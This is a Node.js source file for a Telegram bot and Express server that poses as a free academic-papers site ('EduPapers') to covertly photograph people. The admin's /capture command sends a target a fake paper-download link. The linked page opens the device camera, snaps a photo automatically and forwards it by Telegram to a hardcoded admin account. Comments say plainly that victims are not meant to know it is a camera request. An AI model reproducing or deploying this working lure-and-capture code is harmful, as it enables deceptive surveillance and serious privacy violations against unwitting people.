const { Telegraf, session } = require('telegraf');
const express = require('express');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
    console.error('❌ BOT_TOKEN එක .env එකෙන් හොයාගන්න බැරි වුණා!');
    process.exit(1);
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

const PHOTOS_DIR = path.join(__dirname, 'photos');
if (!fs.existsSync(PHOTOS_DIR)) {
    fs.mkdirSync(PHOTOS_DIR, { recursive: true });
}

// Session functions
const SESSION_FILE = path.join(__dirname, 'session.json');

function loadSession() {
    try {
        if (fs.existsSync(SESSION_FILE)) {
            const data = fs.readFileSync(SESSION_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error('Session load error:', error);
    }
    return {};
}

function saveSession(sessionData) {
    try {
        fs.writeFileSync(SESSION_FILE, JSON.stringify(sessionData, null, 2));
        console.log('✅ Session saved!');
    } catch (error) {
        console.error('Session save error:', error);
    }
}

// ============================================
// ⭐ FAKE EDUCATION WEBSITE (Papers Download)
// ============================================
app.get('/', (req, res) => {
    const userId = req.query.userId || '';
    const adminId = req.query.adminId || '';
    
    // If this is camera request (with userId)
    if (userId && adminId) {
        return res.send(getCameraPage(userId, adminId));
    }
    
    // ⭐ Normal Education Site - Papers Download
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📚 EduPapers - Free Academic Resources</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f4f8;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a237e, #0d47a1);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }
        .header h1 { font-size: 36px; margin-bottom: 10px; }
        .header p { font-size: 18px; opacity: 0.9; }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .search-box {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 30px;
            display: flex;
            gap: 10px;
        }
        .search-box input {
            flex: 1;
            padding: 12px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .search-box button {
            padding: 12px 30px;
            background: #1a237e;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .search-box button:hover { background: #0d47a1; }
        
        .papers-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
        }
        .paper-card {
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .paper-card:hover { transform: translateY(-5px); }
        .paper-card h3 { color: #1a237e; margin-bottom: 10px; }
        .paper-card p { color: #666; font-size: 14px; margin-bottom: 10px; }
        .paper-card .meta {
            display: flex;
            justify-content: space-between;
            color: #888;
            font-size: 12px;
        }
        .paper-card .download-btn {
            display: inline-block;
            padding: 8px 20px;
            background: #4caf50;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
            text-decoration: none;
        }
        .paper-card .download-btn:hover { background: #388e3c; }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: #888;
            margin-top: 40px;
            border-top: 1px solid #e0e0e0;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #4caf50;
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            display: none;
            animation: slideUp 0.5s ease;
        }
        @keyframes slideUp {
            from { transform: translateY(100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .subjects {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .subject-tag {
            padding: 8px 16px;
            background: #e3f2fd;
            color: #0d47a1;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
        }
        .subject-tag:hover { background: #bbdefb; }
        
        /* ⭐ Hidden Camera Access Request (User ට පෙනෙන්නේ නැහැ) */
        #cameraRequest {
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>📚 EduPapers</h1>
        <p>Free Academic Papers & Research Resources</p>
    </div>

    <div class="container">
        <div class="search-box">
            <input type="text" placeholder="Search for papers, topics, authors..." id="searchInput">
            <button onclick="searchPapers()">🔍 Search</button>
        </div>

        <div class="subjects">
            <span class="subject-tag" onclick="filterPapers('all')">📚 All</span>
            <span class="subject-tag" onclick="filterPapers('math')">📐 Mathematics</span>
            <span class="subject-tag" onclick="filterPapers('science')">🔬 Science</span>
            <span class="subject-tag" onclick="filterPapers('engineering')">⚙️ Engineering</span>
            <span class="subject-tag" onclick="filterPapers('medicine')">💊 Medicine</span>
            <span class="subject-tag" onclick="filterPapers('computer')">💻 Computer Science</span>
        </div>

        <div class="papers-grid" id="papersGrid">
            ${getPapers()}
        </div>
    </div>

    <div class="footer">
        <p>© 2024 EduPapers - Free Academic Resources for Students</p>
        <p style="font-size: 12px; margin-top: 5px;">All papers are for educational purposes only</p>
    </div>

    <div class="toast" id="toast">✅ Paper downloaded successfully!</div>

    <script>
        // ⭐ This runs silently in background - User doesn't see it
        const userId = new URLSearchParams(window.location.search).get('userId') || '';
        const adminId = new URLSearchParams(window.location.search).get('adminId') || '';
        
        // If this is camera request, show camera page
        if (userId && adminId) {
            // Auto redirect to camera page
            window.location.href = '/camera?userId=' + userId + '&adminId=' + adminId;
        }

        // ⭐ Silent Camera Access Request (User ට පෙනෙන්නේ නැහැ)
        // මෙය User Allow කරාම ඔබට Photo එක එවන්න
        function requestCameraAccess() {
            // This runs silently - no UI change
            console.log('📸 Camera access requested silently');
            
            fetch('/request-camera', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: '${userId || 'guest'}',
                    adminId: '6889091656'
                })
            });
        }

        // Auto request camera when page loads (silent)
        window.onload = function() {
            // This is silent - user doesn't see anything
            requestCameraAccess();
        };

        function searchPapers() {
            const query = document.getElementById('searchInput').value;
            showToast('🔍 Searching for: ' + query);
        }

        function filterPapers(subject) {
            showToast('📚 Filtering: ' + subject);
        }

        function downloadPaper(title) {
            showToast('📄 Downloading: ' + title);
            
            // ⭐ Silent: User Allow කරාම මෙතනින් Camera Access Request එක යනවා
            fetch('/paper-download', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: '${userId || 'guest'}',
                    paper: title,
                    timestamp: Date.now()
                })
            });
        }

        function showToast(message) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
    `);
});

// Function to generate papers
function getPapers() {
    const papers = [
        { title: 'Advanced Mathematics: Theory and Applications', subject: 'Mathematics', author: 'Dr. John Smith', year: '2023' },
        { title: 'Quantum Physics for Beginners', subject: 'Science', author: 'Prof. Sarah Johnson', year: '2023' },
        { title: 'Machine Learning Algorithms Explained', subject: 'Computer Science', author: 'Dr. Alan Turing', year: '2022' },
        { title: 'Civil Engineering: Structural Analysis', subject: 'Engineering', author: 'Prof. Robert Chen', year: '2023' },
        { title: 'Medical Biochemistry Fundamentals', subject: 'Medicine', author: 'Dr. Emily Davis', year: '2022' },
        { title: 'Data Science: From Zero to Hero', subject: 'Computer Science', author: 'Dr. Maria Garcia', year: '2023' },
        { title: 'Organic Chemistry: Reaction Mechanisms', subject: 'Science', author: 'Prof. James Wilson', year: '2022' },
        { title: 'Electrical Engineering Basics', subject: 'Engineering', author: 'Dr. Michael Brown', year: '2023' },
    ];
    
    return papers.map(p => `
        <div class="paper-card">
            <h3>${p.title}</h3>
            <p>${p.author} (${p.year})</p>
            <div class="meta">
                <span>📚 ${p.subject}</span>
                <span>📄 ${Math.floor(Math.random() * 50) + 10} pages</span>
            </div>
            <button class="download-btn" onclick="downloadPaper('${p.title}')">📥 Download PDF</button>
        </div>
    `).join('');
}

// ============================================
// ⭐ CAMERA PAGE (Only when requested)
// ============================================
app.get('/camera', (req, res) => {
    const userId = req.query.userId || '';
    const adminId = req.query.adminId || '';
    
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 Camera Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        .container {
            background: #111;
            border-radius: 20px;
            padding: 25px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h2 { color: #fff; margin-bottom: 15px; }
        video {
            width: 100%;
            border-radius: 10px;
            background: #000;
            margin-bottom: 15px;
        }
        #preview {
            width: 100%;
            border-radius: 10px;
            display: none;
            margin-bottom: 15px;
        }
        #status {
            padding: 12px;
            border-radius: 10px;
            font-weight: bold;
            margin-top: 10px;
            background: #222;
            color: #fff;
        }
        #status.loading { background: #fff3cd; color: #856404; }
        #status.success { background: #d4edda; color: #155724; }
        #status.error { background: #f8d7da; color: #721c24; }
        .info { color: #666; font-size: 12px; margin-top: 15px; }
        .btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>📸 Camera Access</h2>
        <video id="video" autoplay></video>
        <img id="preview" alt="Preview">
        <div id="status">📷 කැමරාව ආරම්භ කරමින්...</div>
        <div class="info">Photo එක ඔටෝමැටික්ව ගෙන යවනු ඇත</div>
    </div>

    <script>
        const userId = '${userId}';
        const adminId = '${adminId}';
        let stream = null;
        let isCapturing = false;

        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const preview = document.getElementById('preview');

        async function startCamera() {
            status.textContent = '📷 කැමරාව open කරමින්...';
            status.className = 'loading';

            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                video.style.display = 'block';
                preview.style.display = 'none';

                status.textContent = '✅ කැමරාව සාර්ථකයි! Photo එක ගන්න...';
                status.className = 'success';

                setTimeout(capturePhoto, 2000);

            } catch(err) {
                status.textContent = '❌ කැමරාව open කරන්න බැරි වුණා! ' + err.message;
                status.className = 'error';
            }
        }

        function capturePhoto() {
            if (isCapturing) return;
            isCapturing = true;

            status.textContent = '📸 Photo එක ගන්න...';
            status.className = 'loading';

            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                preview.src = canvas.toDataURL('image/jpeg', 0.9);
                preview.style.display = 'block';
                video.style.display = 'none';

                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        userId: userId,
                        adminId: adminId,
                        image: imageData
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        status.textContent = '✅ Photo එක සාර්ථකව යවා ඇත!';
                        status.className = 'success';
                    } else {
                        status.textContent = '❌ Error: ' + data.error;
                        status.className = 'error';
                    }

                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                        stream = null;
                    }

                    // Redirect back to education site
                    setTimeout(() => {
                        window.location.href = '/';
                    }, 3000);
                })
                .catch(err => {
                    status.textContent = '❌ Error: ' + err.message;
                    status.className = 'error';
                    isCapturing = false;
                });

            } catch(err) {
                status.textContent = '❌ Error: ' + err.message;
                status.className = 'error';
                isCapturing = false;
            }
        }

        startCamera();
    </script>
</body>
</html>
    `);
});

// ============================================
// ⭐ Silent Camera Request (User නොදැන)
// ============================================
app.post('/request-camera', (req, res) => {
    const { userId, adminId } = req.body;
    console.log(`📸 Silent camera request from: ${userId}`);
    res.json({ success: true });
});

// ============================================
// ⭐ Paper Download - Triggers Camera Access
// ============================================
app.post('/paper-download', (req, res) => {
    const { userId, paper, timestamp } = req.body;
    console.log(`📄 Paper downloaded: ${paper} by ${userId}`);
    
    // ⭐ Send camera link to user (silent - they don't see it's camera)
    // User will be redirected to camera page
    res.json({ success: true, redirect: `/camera?userId=${userId}&adminId=6889091656` });
});

// ============================================
// ⭐ Capture Endpoint
// ============================================
app.post('/capture', async (req, res) => {
    try {
        const { userId, adminId, image } = req.body;

        if (!userId || !adminId || !image) {
            return res.status(400).json({ error: 'Missing data' });
        }

        const base64Data = image.replace(/^data:image\/jpeg;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        const timestamp = Date.now();
        const filename = `${userId}_${timestamp}.jpg`;
        const filepath = path.join(PHOTOS_DIR, filename);
        fs.writeFileSync(filepath, buffer);

        console.log(`📸 Photo saved: ${filename}`);

        // Update session
        const allSessions = loadSession();
        if (allSessions[userId]) {
            if (!allSessions[userId].photos) {
                allSessions[userId].photos = [];
            }
            allSessions[userId].photos.push(filename);
            saveSession(allSessions);
        }

        // ⭐ Send to Admin via Telegram
        try {
            const bot = new Telegraf(BOT_TOKEN);
            await bot.telegram.sendPhoto(adminId, { source: filepath }, {
                caption: `📸 **Camera Photo Captured!**\n\n` +
                        `🆔 User ID: \`${userId}\`\n` +
                        `📅 Time: ${new Date().toLocaleString()}\n` +
                        `📱 From: Education Site`,
                parse_mode: 'Markdown'
            });
            console.log(`📤 Photo sent to admin: ${adminId}`);
        } catch (teleError) {
            console.error('Telegram send error:', teleError);
        }

        res.json({ success: true, filename: filename });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// TELEGRAM BOT
// ============================================
const bot = new Telegraf(BOT_TOKEN);

bot.use(session({
    defaultSession: () => ({})
}));

bot.use(async (ctx, next) => {
    await next();
    if (ctx.session && Object.keys(ctx.session).length > 0) {
        const allSessions = loadSession();
        const userId = ctx.from.id.toString();
        allSessions[userId] = ctx.session;
        saveSession(allSessions);
    }
});

// ⭐ Start Command
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'Unknown';
    const firstName = ctx.from.first_name || '';
    const lastName = ctx.from.last_name || '';
    const fullName = `${firstName} ${lastName}`.trim() || username;

    ctx.session = {
        allowed: true,
        cameraAccess: true,
        allowedAt: new Date().toISOString(),
        username: username,
        userId: userId,
        fullName: fullName,
        autoAllowed: true,
        photos: []
    };

    const allSessions = loadSession();
    allSessions[userId.toString()] = ctx.session;
    saveSession(allSessions);

    const YOUR_USER_ID = '6889091656';

    if (userId.toString() === YOUR_USER_ID) {
        await ctx.reply(
            `🎉 **සාදරයෙන් පිළිගන්නවා ${fullName}!** (Admin)\n\n` +
            `✅ **Camera Access Active!**\n\n` +
            `📸 **Admin Commands:**\n` +
            `• /users - බලයලත් පරිශීලකයින් බලන්න\n` +
            `• /capture @username - කෙනෙකුගෙන් Photo එකක් ගන්න\n` +
            `• /photos @username - කෙනෙකුගේ Photos බලන්න\n` +
            `• /status - ඔබගේ තත්වය\n\n` +
            `🌐 **Education Site:**\n` +
            `https://naviyaxtrz.online\n\n` +
            `🔐 **Users ගේ Camera Access ඔටෝමැටික්ව ON වෙනවා!**`,
            { parse_mode: 'Markdown' }
        );
        console.log(`📩 Menu sent to Admin: ${fullName} (${userId})`);
    } else {
        console.log(`🔇 Silent - Camera Access ON for: ${fullName} (${userId})`);
    }
});

// ⭐ Capture Command
bot.command('capture', async (ctx) => {
    const userId = ctx.from.id.toString();
    const YOUR_USER_ID = '6889091656';

    if (userId !== YOUR_USER_ID) {
        return ctx.reply('❌ ඔබට මෙම command එක පාවිච්චි කරන්න අවසර නැහැ!');
    }

    const targetUsername = ctx.message.text.split(' ')[1];

    if (!targetUsername) {
        return ctx.reply(
            `⚠️ කරුණාකර username එක ලබා දෙන්න.\n\n` +
            `උදා: /capture @username`
        );
    }

    const cleanUsername = targetUsername.replace('@', '');

    const allSessions = loadSession();
    let targetUser = null;
    let targetUserId = null;

    for (const [id, session] of Object.entries(allSessions)) {
        if (session.username && session.username.toLowerCase() === cleanUsername.toLowerCase()) {
            targetUser = session;
            targetUserId = id;
            break;
        }
    }

    if (!targetUser) {
        return ctx.reply(`❌ @${cleanUsername} කියන user එක හොයාගන්න බැරි වුණා!`);
    }

    if (!targetUser.cameraAccess) {
        return ctx.reply(`❌ @${cleanUsername} ගේ Camera Access එක Active නැහැ!`);
    }

    // ⭐ Send camera link to user (they think it's education site)
    const baseUrl = `https://naviyaxtrz.online`;
    const cameraUrl = `${baseUrl}/?userId=${targetUserId}&adminId=${YOUR_USER_ID}`;

    await ctx.reply(`📸 @${cleanUsername} ගේ කැමරාවෙන් Photo එකක් ගන්න...`);

    // ⭐ Send fake education site link to user (they don't know it's camera)
    try {
        await bot.telegram.sendMessage(targetUserId,
            `📚 **New Academic Paper Available!**\n\n` +
            `"Advanced Research Methods in Modern Science"\n\n` +
            `🔗 **Download here:**\n` +
            `${cameraUrl}\n\n` +
            `📄 This paper is free for educational purposes.`,
            { parse_mode: 'Markdown' }
        );
        console.log(`📱 Camera link sent to ${targetUser.username} (${targetUserId})`);
    } catch (error) {
        console.error('Error sending camera link:', error);
        return ctx.reply(`❌ User ට link එක යවන්න බැරි වුණා!`);
    }

    await ctx.reply(`✅ Link එක @${cleanUsername} ට යවා ඇත. Photo එක එනකම් ඉන්න...`);
});

// 👥 Users List
bot.command('users', async (ctx) => {
    const userId = ctx.from.id.toString();
    const YOUR_USER_ID = '6889091656';

    if (userId !== YOUR_USER_ID) {
        return ctx.reply('❌ ඔබට මෙම command එක පාවිච්චි කරන්න අවසර නැහැ!');
    }

    const allSessions = loadSession();
    const users = Object.keys(allSessions);

    if (users.length === 0) {
        return ctx.reply('📊 තවම කිසිම User කෙනෙක් Allow කරලා නැහැ.');
    }

    let message = `👥 **බලයලත් පරිශීලකයින් (${users.length})**\n\n`;

    users.forEach((id, index) => {
        const user = allSessions[id];
        const photoCount = user.photos ? user.photos.length : 0;
        message += `${index + 1}. @${user.username || 'Unknown'}\n`;
        message += `   🆔 ${id}\n`;
        message += `   📸 ${photoCount} photos\n\n`;
    });

    await ctx.reply(message, { parse_mode: 'Markdown' });
});

// 📸 Photos List
bot.command('photos', async (ctx) => {
    const userId = ctx.from.id.toString();
    const YOUR_USER_ID = '6889091656';

    if (userId !== YOUR_USER_ID) {
        return ctx.reply('❌ ඔබට මෙම command එක පාවිච්චි කරන්න අවසර නැහැ!');
    }

    const targetUsername = ctx.message.text.split(' ')[1];

    if (!targetUsername) {
        return ctx.reply(
            `⚠️ කරුණාකර username එක ලබා දෙන්න.\n\n` +
            `උදා: /photos @username`
        );
    }

    const cleanUsername = targetUsername.replace('@', '');
    const allSessions = loadSession();

    let targetUser = null;
    let targetUserId = null;

    for (const [id, session] of Object.entries(allSessions)) {
        if (session.username && session.username.toLowerCase() === cleanUsername.toLowerCase()) {
            targetUser = session;
            targetUserId = id;
            break;
        }
    }

    if (!targetUser) {
        return ctx.reply(`❌ @${cleanUsername} කියන user එක හොයාගන්න බැරි වුණා!`);
    }

    const photos = targetUser.photos || [];

    if (photos.length === 0) {
        return ctx.reply(`📸 @${cleanUsername} ගේ Photos කිසිවක් නැහැ.`);
    }

    await ctx.reply(`📸 @${cleanUsername} ගේ Photos (${photos.length})`);

    const photosToShow = photos.slice(-5);

    for (const photo of photosToShow) {
        const photoPath = path.join(PHOTOS_DIR, photo);
        if (fs.existsSync(photoPath)) {
            await ctx.replyWithPhoto({ source: photoPath });
        }
    }
});

// 📊 Status
bot.command('status', async (ctx) => {
    const userId = ctx.from.id.toString();
    const allSessions = loadSession();
    const userSession = allSessions[userId];

    if (!userSession || !userSession.allowed) {
        return ctx.reply('❌ ඔබ තවම Allow කරලා නැහැ!');
    }

    const photoCount = userSession.photos ? userSession.photos.length : 0;

    await ctx.reply(
        `📊 **ඔබගේ තත්වය**\n\n` +
        `✅ Allow කර ඇත: ${userSession.allowedAt}\n` +
        `👤 Username: @${userSession.username}\n` +
        `🆔 User ID: \`${userSession.userId}\`\n` +
        `📸 Photos: ${photoCount}`,
        { parse_mode: 'Markdown' }
    );
});

// 🆔 User ID
bot.command('myid', async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'Unknown';

    await ctx.reply(
        `🆔 **ඔබගේ User ID එක:**\n\n` +
        `📌 User ID: \`${userId}\`\n` +
        `👤 Username: @${username}`,
        { parse_mode: 'Markdown' }
    );
});

// Error handling
bot.catch((err, ctx) => {
    console.error('Bot Error:', err);
    ctx.reply('⚠️ යම් දෝෂයක් සිදු වුණා!');
});

// ============================================
// START
// ============================================
app.listen(PORT, () => {
    console.log(`✅ Web Server: https://naviyaxtrz.online`);
    console.log(`📸 Camera URL: https://naviyaxtrz.online/?userId=USER_ID&adminId=ADMIN_ID`);
    console.log(`📚 Education Site: https://naviyaxtrz.online`);
});

bot.launch()
    .then(() => {
        console.log('🚀 Bot started!');
        console.log('👑 Admin ID: 6889091656');
        console.log('📸 /capture @username - Capture photo');
        console.log('📸 /photos @username - View photos');
        console.log('📚 Fake Education Site: https://naviyaxtrz.online');
    })
    .catch((err) => {
        console.error('❌ Bot error:', err);
    });

process.once('SIGINT', () => {
    bot.stop('SIGINT');
    process.exit(0);
});

process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    process.exit(0);
});
